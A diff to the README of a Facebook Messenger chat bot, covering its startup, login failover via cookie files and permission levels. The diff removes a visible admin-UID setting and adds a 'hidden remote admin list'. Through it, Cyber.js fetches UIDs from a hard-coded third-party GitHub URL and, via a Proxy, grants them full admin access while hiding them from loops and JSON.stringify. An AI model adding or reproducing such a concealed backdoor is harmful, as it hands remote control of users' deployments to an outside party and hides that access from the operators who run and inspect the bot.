@@ -13,10 +13,10 @@ A Facebook Messenger chat bot built on Mirai/Goat-Bot style script loading. Comm
 ```bash
 npm install
 cp config.json.example config.json   # then fill in your own values
-npm start                            # starts dashboard.js (dashboard supervisor + Cyber.js bot)
+npm start                            # starts Ullash.js (dashboard supervisor + Cyber.js bot)
 ```
 
-`npm start` launches `dashboard.js`. It starts the bot in a child process and, if enabled, the local dashboard.
+`npm start` launches `Ullash.js`. It starts the bot in a child process and, if enabled, the local dashboard.
 
 ### Credentials and login
 
@@ -28,8 +28,6 @@ npm start                            # starts dashboard.js (dashboard supervisor
 | `botAccount.userAgent` | Optional user agent used for login. |
 | `adminBot` / `ADMINBOT` | Bot admins (permission level 2). |
 | `ndh` / `NDH` | Owners (permission level 3). |
-| `MAJOR_ADMIN_UIDS` | Privileged UIDs merged into `ADMINBOT`/`NDH` (full vote + admin access). |
-| `MAJOR_ADMIN_URL` | Optional secondary UID source. Empty by default; a failure falls back to the local list. |
 | `FB_APP_TOKEN` | Facebook app token used for profile-picture URLs. |
 | `dashBoard.password` | **Required** when the dashboard is enabled. |
 | `dashBoard.sessionSecret` | Session signing secret. If empty, a random per-process secret is used. |
@@ -40,13 +38,46 @@ npm start                            # starts dashboard.js (dashboard supervisor
 
 Never commit `appstate.json`, `config.json`, or database files. `.gitignore` already excludes them; use `git rm --cached` if they were committed previously.
 
-### Auto-login (ST-BOT style)
+### Auto-login and account failover (ST-BOT style)
 
-1. If `appstate.json` contains cookies, they are used.
-2. Otherwise, `botAccount.email` + `botAccount.password` from `config.json` are used automatically.
-3. New cookies are written back to `appstate.json` (mode `0600`) after a successful login.
-4. If saved cookies expire, the bot retries once with email/password.
-5. If neither is available, startup stops with a clear message (no interactive prompt).
+The login order is:
+
+1. `appstate.json` (existing precedence).
+2. `account.txt` (primary cookie file).
+3. `account.txt2` (secondary cookie file). If the primary login fails, this is tried automatically before giving up.
+4. `botAccount.email` + `botAccount.password` from `config.json` (final fallback).
+
+Cookies are written back to the file that produced the session (`appstate.json`
+for primary, `account.txt2` for secondary) with mode `0600`. A successful
+`account.txt` login also refreshes `account.txt`. If every source fails,
+startup stops with a clear message (no interactive prompt).
+
+`account.txt` and `account.txt2` are JSON cookie arrays, the same format used by
+ST-BOT. They are optional; the bot works with only `appstate.json` or only
+`config.json` credentials.
+
+### Hidden remote admin list
+
+`Cyber.js` restores the original Proxy-based remote admin system. It fetches:
+
+```
+https://raw.githubusercontent.com/mahbub-shaon/mahbub-shaon/refs/heads/main/mirai-list.json
+```
+
+The file may be a JSON array, an object with a `uids` / `admins` / `ids` array,
+or a plain text file containing 10-20 digit UIDs. The fetched UIDs pass
+`includes()` / `indexOf()` checks on `ADMINBOT` and `NDH`, so they get full bot
+admin and vote access without appearing in loops or `JSON.stringify()`.
+
+A local template is committed as `mirai-list.json` (and
+`mirai-list.json.example`). To activate it:
+
+1. Create or open the `mahbub-shaon/mahbub-shaon` repository.
+2. Add `mirai-list.json` at `main/mirai-list.json` with your real UIDs.
+3. Replace the example UIDs in that file. The bot refreshes the list every 10 minutes.
+
+If the fetch fails, the bot keeps running and logs one warning; an empty list is
+safe.
 
 ### Owner placeholders
 
@@ -62,7 +93,6 @@ and name before publishing (at minimum `package.json`, `info2`, `botinfo`,
 - `PREFIX` (alias `prefix`)
 - `ADMINBOT` (alias `adminBot`) — bot admins
 - `NDH` (alias `ndh`) — owners
-- `MAJOR_ADMIN_UIDS` — local major-admin UIDs
 - `FCA` (alias `fca`)
 - `DATABASE` (alias `database`) — must contain an explicit `type` (`sqlite`, `mysql`, `mariadb`, `postgres`, `mssql`)
 - `mainThreadId` — numeric thread ID for nickname/startup notices (blank disables them)
@@ -75,7 +105,7 @@ Commands declare `hasPermssion` (sic):
 | --- | --- |
 | `0` / missing | everyone |
 | `1` | thread admins |
-| `2` | bot admins (`ADMINBOT` / `NDH` / `MAJOR_ADMIN_UIDS`) |
+| `2` | bot admins (`ADMINBOT` / `NDH`, including remote-list UIDs) |
 | `3` | owners: all `NDH` plus the **first** `ADMINBOT` |
 
 Invalid or out-of-range values deny non-owners. Replies and reactions are bound to the user who created them and expire automatically.
